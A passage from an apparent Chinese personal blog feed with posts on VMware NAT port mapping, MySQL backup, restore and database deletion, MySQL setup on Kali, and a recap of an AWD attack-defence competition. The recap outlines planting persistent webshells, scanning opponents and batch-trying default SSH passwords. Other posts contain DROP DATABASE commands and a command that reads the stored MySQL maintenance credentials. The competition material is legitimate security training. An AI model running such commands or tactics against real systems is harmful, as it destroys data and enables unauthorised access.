title="NAT模式"></a>NAT模式</h3><p>NAT模式，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。</p><p>NAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是在vmware提供的一个虚拟网络。</p><p> 可以理解为：虚拟机处于物理机中vmware配置的一个虚拟局域网里，大概可以理解为这样的一个层次关系：</p><p>公网——&gt;路由——&gt;局域网——&gt;物理主机——&gt;vmware虚拟网络——&gt;虚拟机</p><p>也就是说，这时，外网或局域网能够访问到物理主机，物理主机和虚拟机也都能正常访问外网和局域网，而且用的是一个局域网IP。</p><p>但在没有建立网络映射的情况下，外网和局域网不能通过物理主机访问到虚拟机。</p><p>其实外网访问物理主机也是一样的，如果没有路由和交换机构建的网络映射，外网也同样无法通过路由的公网ip访问到物理主机。</p><p>所以，只要模拟路由器在物理主机和虚拟机之间构建好网络映射，就能同过物理机ip和特定端口访问到虚拟机了。</p><p><img src="%5Cimg%5Cimage-20201119222136524.png" alt="image-20201119222136524"></p><p>点击右边的NAT设置，配置主机和虚拟机的端口映射</p><p><img src="%5Cimg%5Cimage-20201119223052918.png" alt="image-20201119223052918"></p><p>上面我将虚拟机的80端口映射到了物理机的8000端口上，也就是说，只要开启虚拟机的apache服务，就可以通过访问 <em>http://物理机ip:8000</em> 这个地址，访问到虚拟机网站服务。</p><p>另外一个网站服务类同。</p><p>测试一下</p><p><img src="%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119213503.png" alt=""></p><p>ubuntu本地访问</p><p><img src="%5Cimg%5C3V6V_D2AAG9VSZG$REMH4KI.png" alt="img"></p><p>查看物理机IP：192.168.43.150</p><p><img src="%5Cimg%5C3@N8QYWOA@RJ%5BZHAQC2M36.png" alt="img"></p><p><img src="%5Cimg%5CQQ%E5%9B%BE%E7%89%8720201119223825.png" alt=""></p><p>物理机上浏览器使用本机ip加8000端口访问ubuntu网站服务成功</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL数据库备份与还原</title>
      <link href="/2020/11/18/2020-11-18-shu-ju-ku-bei-fen-yu-huan-yuan/"/>
      <url>/2020/11/18/2020-11-18-shu-ju-ku-bei-fen-yu-huan-yuan/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL数据库备份与还原"><a href="#MySQL数据库备份与还原" class="headerlink" title="MySQL数据库备份与还原"></a>MySQL数据库备份与还原</h1><pre><code>数据库文件默认在：cd /usr/share/mysql配置文件默认在：/etc/my.cnf数据库目录：/var/lib/mysql/配置文件：/usr/share/mysql(mysql.server命令及配置文件)相关命令：/usr/bin(mysqladmin、mysqldump等命令)(*mysql的一种安全启动方式：/usr/bin/mysqld_safe –user=root &amp;)启动脚本：/etc/rc.d/init.d/</code></pre><p>你可以使用以下的命令来寻找MySQL：</p><pre><code>[root@stuhome /]# find / -name “mysql” -print或whereis mysql</code></pre><p>一般来说mysql是放在/usr/local/mysql/下的。<br>然后在其bin目录下有个mysql_config文件，vim，会看见这么一句：</p><pre><code>ldata=’/usr/local/mysql/var’</code></pre><p>rpm安装默认目录：</p><pre><code>数据文件：/var/lib/mysql/配置文件模板：/usr/share/mysqlmysql客户端工具目录：/usr/bin日志目录：/var/log/pid，sock文件目录：/tmp/</code></pre><h2 id="备份数据库和还原MySQL"><a href="#备份数据库和还原MySQL" class="headerlink" title="备份数据库和还原MySQL"></a><strong>备份数据库和还原MySQL</strong></h2><p>备份和还原MySQL数据库的步骤：</p><h3 id="如何使用CLI备份数据库"><a href="#如何使用CLI备份数据库" class="headerlink" title="如何使用CLI备份数据库"></a><strong>如何使用CLI备份数据库</strong></h3><p>使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。</p><pre><code>mysqldump -u[uname] -p[pass] [dbname] &gt; [backupfile].sql</code></pre><ul><li>[uname] - 是有权访问数据库的用户的名称；</li><li>[pass] - 用户密码；</li><li>[dbname] - 是要备份或导出的数据库的名称；</li><li>[backupfile] - 是备份文件的名称。</li></ul><p>提供一个示例数据库配置，比如要将linuxidc这个数据库导出为一个文件名为linuxidc-back.sql的数据库文件到当前目录下，则输入下面的命令：</p><p>[liloong@localhost ~/<a href="http://www.linuxidc.com]$mysqldump" target="_blank" rel="noopener">www.linuxidc.com]$mysqldump</a> -uroot -proot mysql &gt; mysql-back.sql</p><p>用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql</p><p>需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。</p><h3 id="如何使用CLI还原数据库"><a href="#如何使用CLI还原数据库" class="headerlink" title="如何使用CLI还原数据库"></a><strong>如何使用CLI还原数据库</strong></h3><p>恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。</p><pre><code>mysql -u[uname] -p[pass] [dbname] &lt; [backupfile].sql</code></pre><ul><li>[uname] - 是有权访问数据库的用户名；</li><li>[pass] - 用户密码；</li><li>[dbname] - 是要还原或导入的数据库的名称；</li><li>[backupfile] - 是还原文件的名称。</li></ul><p>给出一个数据库还原示例，如下所示：</p><p>[linuxidc@localhost ~/<a href="http://www.linuxidc.com]$mysqldump" target="_blank" rel="noopener">www.linuxidc.com]$mysqldump</a> -uroot -pv linuxidc &lt; linuxidc-back.sql</p><p><img src="https://www.linuxidc.com/upload/2020_03/20030313493957.png" alt="备份和还原MySQL数据库的简便方法"></p><h3 id="其他命令参考"><a href="#其他命令参考" class="headerlink" title="其他命令参考:"></a><strong>其他命令参考:</strong></h3><p>备份远程MySQL数据库的命令</p><pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] &gt; backupfile.sql</code></pre><p>备份MySQL数据库为带删除表的格式备份MySQL数据库为带删除表的格式，能够让该备份覆盖已有数据库而不需要手动删除原有数据库。</p><pre><code>mysqldump ---add-drop-table -u[username] -p[password] [databasename] &gt; backupfile.sql</code></pre><p>（远程）直接将MySQL数据库压缩备份</p><pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] | gzip &gt; backupfile.sql.gz</code></pre><p>（远程）备份MySQL数据库某个(些)表</p><pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] [table1 table2] &gt; backupfile.sql</code></pre><p>（远程）同时备份多个MySQL数据库</p><pre><code>mysqldump -h[hostname] -u[username] -p[password] --databases [databasename1 databasename2 databasename3] &gt; multibackupfile.sql</code></pre><p>仅仅备份数据库结构</p><pre><code>mysqldump -u[username] -p[password] --no-data --databases [databasename1 databasename2 databasename3] &gt; structurebackupfile.sql</code></pre><p>备份服务器上所有数据库</p><pre><code>mysqldump -u[username] -p[password] --all-databases &gt; allbackupfile.sql</code></pre><p>（远程）还原MySQL数据库的命令</p><pre><code>mysql -h[hostname] -u[username] -p[password] [databasename] &lt; backupfile.sql</code></pre><p>还原压缩的MySQL数据库</p><pre><code>gunzip &lt; backupfile.sql.gz | mysql -u[username] -p[password] [databasename]</code></pre><h3 id="简单粗暴的方法"><a href="#简单粗暴的方法" class="headerlink" title="简单粗暴的方法"></a>简单粗暴的方法</h3><p><strong>备份，直接复制整个数据库目录</strong></p><p>　　MySQL有一种非常简单的备份方法，就是将MySQL中的数据库文件直接复制出来。这是最简单，速度最快的方法。</p><p>不过在此之前，要先将服务器停止，这样才可以保证在复制期间数据库的数据不会发生变化。如果在复制数据库的过程中还有数据写入，就会造成数据不一致。这种情况在开发环境可以，但是在生产环境中很难允许备份服务器。</p><p>　　注意：这种方法不适用于InnoDB存储引擎的表，而对于MyISAM存储引擎的表很方便。同时，还原时MySQL的版本最好相同。</p><p><strong>还原，直接替换复制目录的备份</strong></p><p> 　　通过这种方式还原时，必须保证两个MySQL数据库的版本号是相同的。MyISAM类型的表有效，对于InnoDB类型的表不可用，InnoDB表的表空间不能直接复制。</p><h3 id="MySQL-删除数据库"><a href="#MySQL-删除数据库" class="headerlink" title="MySQL 删除数据库"></a>MySQL 删除数据库</h3><h2 id="drop-命令删除数据库"><a href="#drop-命令删除数据库" class="headerlink" title="drop 命令删除数据库"></a>drop 命令删除数据库</h2><p>drop 命令格式：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">database</span> <span class="token operator">&lt;</span>数据库名<span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SQL</p><p>例如删除名为 geekdocs 的数据库：</p><pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">drop</span> <span class="token keyword">database</span> databasename<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SQL</p><h2 id="使用-mysqladmin-删除数据库"><a href="#使用-mysqladmin-删除数据库" class="headerlink" title="使用 mysqladmin 删除数据库"></a>使用 mysqladmin 删除数据库</h2><p>你也可以使用 mysql mysqladmin 命令在终端来执行删除命令。</p><p>以下实例删除数据库 geekdocs(该数据库在前一章节已创建)：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysqladmin -u root -p drop databasename</span>Enter password:******<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>SQL</p><p>执行以上删除数据库命令后，会出现一个提示框，来确认是否真的删除数据库：</p><pre class="line-numbers language-mysql"><code class="language-mysql">Dropping the database is potentially a very bad thing to do.Any data stored in the database will be destroyed.Do you really want to drop the 'databasename' database [y/N] yDatabase "databasename" dropped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SQL</p><hr><h2 id="使用PHP脚本删除数据库"><a href="#使用PHP脚本删除数据库" class="headerlink" title="使用PHP脚本删除数据库"></a>使用PHP脚本删除数据库</h2><p>PHP使用 mysqli_query 函数来创建或者删除 MySQL 数据库。</p><p>该函数有两个参数，在执行成功时返回 TRUE，否则返回 FALSE。</p><p><strong>语法</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">mysqli_query</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span>query<span class="token punctuation">,</span>resultmode<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SQL</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><em>connection</em></td><td align="center">必需。规定要使用的 MySQL 连接。</td></tr><tr><td align="center"><em>query</em></td><td align="center">必需，规定查询字符串。</td></tr><tr><td align="center"><em>resultmode</em></td><td align="center">可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认）</td></tr></tbody></table><p>以下实例演示了使用PHP mysqli_query函数来删除数据库：</p><p><strong>删除数据库</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$dbhost</span> <span class="token operator">=</span> <span class="token string">'localhost:3306'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// mysql服务器主机地址</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// mysql用户名</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">'123456'</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// mysql用户名密码</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$dbhost</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$conn</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'连接失败: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'连接成功&lt;br />'</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">'DROP DATABASE geekdocs'</span><span class="token punctuation">;</span><span class="token variable">$retval</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span> <span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$retval</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'删除数据库失败: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"数据库 geekdocs 删除成功\n"</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SQL</p><p>执行成功后，数结果为：</p><p><img src="https://img.geek-docs.com/2020/mysql/15884912846675186.jpg" alt="img"></p><p><strong>注意：</strong><br>在使用PHP脚本删除数据库时，不会出现确认是否删除信息，会直接删除指定数据库，所以你在删除数据库时要特别小心。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯AWD线下赛总结</title>
      <link href="/2020/11/18/2020-11-18-hu-xiang-bei-xian-xia-awd-zong-jie/"/>
      <url>/2020/11/18/2020-11-18-hu-xiang-bei-xian-xia-awd-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯AWD线下赛总结"><a href="#湖湘杯AWD线下赛总结" class="headerlink" title="湖湘杯AWD线下赛总结"></a>湖湘杯AWD线下赛总结</h1><p>第一次参加线下赛，之前看了很多资料做了很多准备，心里也确实紧张，去之前心里一直非常焦灼。</p><p>对于没把握的事非常非常紧张，这或许是我个人的一个重大缺点，经常使我难以良好的做到临场发挥，并且在行动之前自暴自弃。</p><p>比赛分上午下午两场，上午是线下做题模式，下午是AWD攻防。</p><p>上午的做题给了提交平台的ip地址和本队的用户名密码，还有靶机ip。</p><p>我们的主机是用一根网线连进了一个198开头的局域网里，靶机在172，这两个局域网连接起来的。</p><p>刚开始真的很懵，没料到还有这一出，以为上午下午都是攻防。突然来这一出，导致一开始没有想到要连靶机，就是埋着头硬写题。</p><p>第一个flag是经典送分题，御剑扫一下目录，发现目录下wwwroot.zip文件，直接给源码 ，下载下来主目录就有一个名为flag的无后缀文件，出于谨慎考虑，我还放kali里file了一下文件类型，发现是text，然后直接改后缀为txt，得到flag，这时队友已经提交了。</p><p>然后就是robots.txt，内容是</p><pre><code>disallow:/admin/</code></pre><p>不允许访问admin目录</p><p>看一看源文件，主页是index.php,于是改url为 <a href="http://ip/index.php/admin/" target="_blank" rel="noopener">http://ip/index.php/admin/</a> ，成功来到管理员登陆界面。</p><p>sqlmap注入失败，burpsuite暴破失败。队友找到了runtime目录下的log文件，结果由于我做题经验稀缺，一直被那个虚假的admin用户密码迷惑，又不敢直接否定或肯定自己的思路，费了很多时间，赛后大佬告诉我账号密码就在那个log文件里，只是我没找对地方而已。</p><p><img src="/img/image-20201117181349246.png" alt=""></p><p>下午AWD攻防，前半个小时加固，备份靶机，然后开放攻击。之前我们都没参加过AWD，不知道该怎么办，就准备了很多攻击防御框架，脚本。</p><p>然而实战怎么没用上。又很多问题遇到了以后不太敢搞，然后队友会的我也会，我不会的队友也不会，配合性也很差。</p><p>过程没啥好说，直接总结问题：</p><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><p>其实要第一时间准备好的东西其实不是什么攻击脚本，流量监控脚本，那东西变数太大。</p><p>要准备的是：个人shell，不死马文件，记事本打开，虚拟机打开，蚁剑打开，工作目录准备好</p><p>起手工作其实要做的就是把所有能提前准备好的东西准备好，得以让比赛开始后省去不必要的时间开销。开放攻击前的半个小时</p><p>就是争分夺秒，时间就是生命。改ssh密码，备份网站目录，备份数据库，D盾查杀木马，上传自己的🐎，这全要一气呵成，在攻击开放前搞完，否则大佬的批量化攻击脚本会瞬间攻陷你的主机，另一队的靶机1的数据库早早就被删了，我们运气好，被删的晚。</p><p>这里放一下数据库备份还原方法：</p><p><strong>如何使用CLI备份数据库</strong></p><p>使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。</p><pre class="line-numbers language-shell"><code class="language-shell">mysqldump -u[uname] -p[pass] [dbname] > [backupfile].sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>[uname] - 是有权访问数据库的用户的名称；</li><li>[pass] - 用户密码；</li><li>[dbname] - 是要备份或导出的数据库的名称；</li><li>[backupfile] - 是备份文件的名称。</li></ul><p>提供一个示例数据库配置，比如要将mysql这个数据库导出为一个文件名为mysql-back.sql的数据库文件到当前目录下，则输入下面的命令：</p><pre class="line-numbers language-shell"><code class="language-shell">[liloong@localhost ~/Backup]$mysqldump -uroot -proot mysql > mysql-back.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql</p><p>需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。但-u后面可以有。</p><p><strong>如何使用CLI还原数据库</strong></p><p>恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。</p><pre class="line-numbers language-php"><code class="language-php">mysql <span class="token operator">-</span>u<span class="token punctuation">[</span>uname<span class="token punctuation">]</span> <span class="token operator">-</span>p<span class="token punctuation">[</span>pass<span class="token punctuation">]</span> <span class="token punctuation">[</span>dbname<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token punctuation">[</span>backupfile<span class="token punctuation">]</span><span class="token punctuation">.</span>sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>[uname] - 是有权访问数据库的用户名；</li><li>[pass] - 用户密码；</li><li>[dbname] - 是要还原或导入的数据库的名称；</li><li>[backupfile] - 是还原文件的名称。</li></ul><p>然后攻击就开始了，第一件事，扫对手的IP，所以kali可以早早的开好，把命令也准备好，开放以后直接用nmap或者赶时间用masscan扫，扫出来以后甚至可以尝试用ssh默认密码或靶机里原始的shell密码批量连接一下，因为真的有人不知道改ssh密码的！</p><h3 id="二、挖洞"><a href="#二、挖洞" class="headerlink" title="二、挖洞"></a>二、挖洞</h3><p>这次比赛，防御不防御的根本不是最重要的，最重要的是攻击！一个别人没有审计出的漏洞几乎就可以抵消大佬对你造成的所有伤害了。</p><p><strong>代码审计！</strong>要加强！<strong>挖洞</strong>！这才是AWD的核心！</p><p>什么批量化脚本，什么流量监控，在我们现在这个阶段就是空话！真正的大佬都是现场写脚本的！要想把这些脚本用好，下次得把它们的源码研究了，了解了原理，才能最大限度地发挥作用。</p><p>而只要挖到了一个大部分人没掌握的洞，后续输出就像割韭菜一样。</p><h3 id="三、技术细节"><a href="#三、技术细节" class="headerlink" title="三、技术细节"></a>三、技术细节</h3><p>有很技术细节真的是不来参加一次比赛接触不到的。</p><p>比如不死马。其原理和克制方法，网上一查，全都说的头头是道的，实际操作起来可能完全不一样。比如这次，网上说使用</p><pre class="line-numbers language-shell"><code class="language-shell">ps aux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令查看进程，然后 </p><pre class="line-numbers language-shell"><code class="language-shell">kill -9 [PID]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>杀进程，就能把不死马进程杀掉了。然而，不死马进程的权限是www-data用户的，我们所使用的赛方提供的ubuntu用户根本杀不了它的进程，又或是由于它在不断动态生成，导致进程的PID一直在变(这一段不知道说的对不对)。反正它显示，“不存在该PID的进程”。</p><p>但赛后大佬说直接杀掉全部apache2进程就行了，利用自己传的shell执行命令</p><pre class="line-numbers language-shell"><code class="language-shell">killall apache2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接让apache2重启，所有相关进程自然没有了</p><p>还有大佬说这次主办方直接在靶机里留了Busybox,</p><p><img src="/img/image-20201117211912516.png" alt=""></p><p>使用</p><pre class="line-numbers language-shell"><code class="language-shell">/bin/busybox sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用busybox,就可以随便搞了，任意执行命令，这样就可以执行比赛前准备的第三方脚本而不用担心没有权限了。</p><p>又或者，如果没有执行权限，可以先给要执行的文件+x，然后用scp命令传上靶机，因为scp命令是带权限复制的（又是一个非常有用的小细节）</p><p>然后，我们这次没扫出对面ip ,完全是我自己傻逼了的原因。因为之前没用过nmap和masscan, 完全通过文档学习。一开始扫不出东西，我还以为是我命令输错 了，懵逼了好久，然后后来想到了可能D段里没有别的主机了，不同选手的靶机可能在不同的C段，然后nmap扫，扫了快十分钟没扫出来（后来知道选手的靶机在100-150），放弃了，主要是当时心态炸了。</p><p>这次知道了我操作的没问题，下次就会自信多了</p><p>这次的AWD只能说惨淡收场，但明年再战的时候，必重拳出击</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在kali上使用mysql时遇到的一些情况</title>
      <link href="/2020/11/11/2020-11-11-zai-kali-shang-shi-yong-mysql-shi-yu-dao-de-yi-xie-qing-kuang/"/>
      <url>/2020/11/11/2020-11-11-zai-kali-shang-shi-yong-mysql-shi-yu-dao-de-yi-xie-qing-kuang/</url>
      
        <content type="html"><![CDATA[<h1 id="在kali上使用mysql时遇到的一些情况"><a href="#在kali上使用mysql时遇到的一些情况" class="headerlink" title="在kali上使用mysql时遇到的一些情况"></a>在kali上使用mysql时遇到的一些情况</h1><h3 id="如何重启MySQL，正确启动MySQL"><a href="#如何重启MySQL，正确启动MySQL" class="headerlink" title="如何重启MySQL，正确启动MySQL"></a>如何重启MySQL，正确启动MySQL</h3><p>linux平台及windows平台mysql重启方法</p><h4 id="Linux下重启MySQL的正确方法："><a href="#Linux下重启MySQL的正确方法：" class="headerlink" title="　　Linux下重启MySQL的正确方法："></a>　　Linux下重启MySQL的正确方法：</h4><p>　　1、通过rpm包安装的MySQL</p><pre><code>　service mysqld restart</code></pre><p>　　2、从源码包安装的MySQL</p><p>　　// linux关闭MySQL的命令</p><pre><code>$mysql_dir/bin/mysqladmin -uroot -p shutdown</code></pre><p>　　// linux启动MySQL的命令</p><pre><code>$mysql_dir/bin/mysqld_safe &amp;</code></pre><p>　　其中mysql_dir为MySQL的安装目录，mysqladmin和mysqld_safe位于MySQL安装目录的bin目录下，很容易找到的。</p><p>　　3、以上方法都无效的时候，可以通过强行命令：“killall mysql”来关闭MySQL，但是不建议用这样的方式，因为这种野蛮的方法会强行终止MySQL数据库服务，有可能导致表损坏</p><p>使用这个命令后，输入mysql的结果可能呈现为</p><p>ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’</p><p>使用下面方法启动就行</p><p>　　步骤或方法:RedHat Linux (Fedora Core/Cent OS)</p><p>　　1.启动：/etc/init.d/mysqld start</p><p>　　2.停止：/etc/init.d/mysqld stop</p><p>　　3.重启：/etc/init.d/mysqld restart</p><p>　　Debian / Ubuntu Linux</p><p>　　1.启动：/etc/init.d/mysql start</p><p>　　2.停止：/etc/init.d/mysql stop</p><p>　　3.重启：/etc/init.d/mysql restart</p><h4 id="Windows下重启MySQL的正确方法："><a href="#Windows下重启MySQL的正确方法：" class="headerlink" title="　　Windows下重启MySQL的正确方法："></a>　　Windows下重启MySQL的正确方法：</h4><p>　　1.点击“开始”-&gt;“运行”(快捷键Win+R)。</p><p>　　2.启动：输入 net start mysql</p><p>　　3.停止：输入 net stop mysql</p><blockquote><p>2021.2.20 发现新东西，来补充一下</p></blockquote><h3 id="安装Mysql-server"><a href="#安装Mysql-server" class="headerlink" title="安装Mysql server"></a>安装Mysql server</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> mysql-server mysql-client<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-设置密码"><a href="#2-设置密码" class="headerlink" title="2.设置密码"></a>2.设置密码</h4><ul><li><strong>查看系统自动安装的用户名密码</strong>（有时候第一次安装完，把密码忘了，可以看看有没有这个文件）</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /etc/mysql/debian.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>用系统的用户名密码登陆</li></ul><pre class="line-numbers language-mysql"><code class="language-mysql">mysql -u username -pmysql> show databases;mysql> use mysql;mysql> select host, user, password[authentication_string], plugin from user; //查看信息,注意mysql版本，自行选择password还是authentication_string// mysql 5.7.9以前版本修改密码mysql>update user set password=password('admin') where user='admin';// mysql 5.7.9及以后版本修改密码mysql> update user set authentication_string=PASSWORD("yourpassword") where user="root";如果报错就用下面这一条语句mysql> ALTER user 'root'@'localhost' IDENTIFIED BY 'yourpassword'mysql> update user set plugin="mysql_native_password"; //可有可无mysql> flush privileges;mysql> quit;//重启来生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>mysql 数据库下的 user 表中存储着用户的基本权限，可以使用 SELECT 语句来查看。SELECT 语句的代码如下：</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql > SELECT * FROM mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要执行该语句，必须拥有对 user 表的查询权限。</p><p>注意：新创建的用户只有登录 MySQL 服务器的权限，没有任何其它权限，不能查询 user 表。</p><p>除了使用 SELECT 语句之外，还可以使用 SHOW GRANTS FOR 语句查看权限。其语法格式如下：</p><pre class="line-numbers language-mysql"><code class="language-mysql">SHOW GRANTS FOR 'username'@'hostname';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，username 表示用户名，hostname 表示主机名或主机 IP。</p><p><strong>要获得当前用户的信息，使用user()函数，如下面的语句所示。</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql> SELECT user();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>current_user 函数</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql> SELECT current_user();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="时隔许久，终于知道kali用户登不进mysql的原因了"><a href="#时隔许久，终于知道kali用户登不进mysql的原因了" class="headerlink" title="时隔许久，终于知道kali用户登不进mysql的原因了"></a>时隔许久，终于知道kali用户登不进mysql的原因了</h2><blockquote><p>MariaDB的root默认连接方式是<code>unix_socket</code>(MariaDB)<br>在Debian中软件包mysql已经替换成了mariadb了。在安装后<code>/etc/mysql/debian.cnf</code>预设了root用户使用socket的连接方式，所以不输入密码也可在命令行直接使用mysql命令登录。</p><p>而我一开始并没有设置密码，用kali用户登不上纯属是因为socket连不上</p></blockquote><h3 id="MariaDB默认密码和修改方法"><a href="#MariaDB默认密码和修改方法" class="headerlink" title="MariaDB默认密码和修改方法"></a>MariaDB默认密码和修改方法</h3><blockquote><p>查看默认密码<br>某些发行版本，使用包管理器安装MySQL后，查看这个文件可以看到安装后的默认密码<code>/etc/mysql/debian.cnf</code>，这个密码是属于<code>debian-sys-maint</code>的，而非<code>root</code>。<br>即使在这里你可能可以使用root用户登录，因为root用户默认登录方式是使用socket连接，而不验证密码。</p></blockquote><p><strong>要想使用密码连接需要修改连接方式</strong></p><ol><li>输入mysql进入客户端，若无法进入则跳过。</li><li>输入<code>select user, plugin from 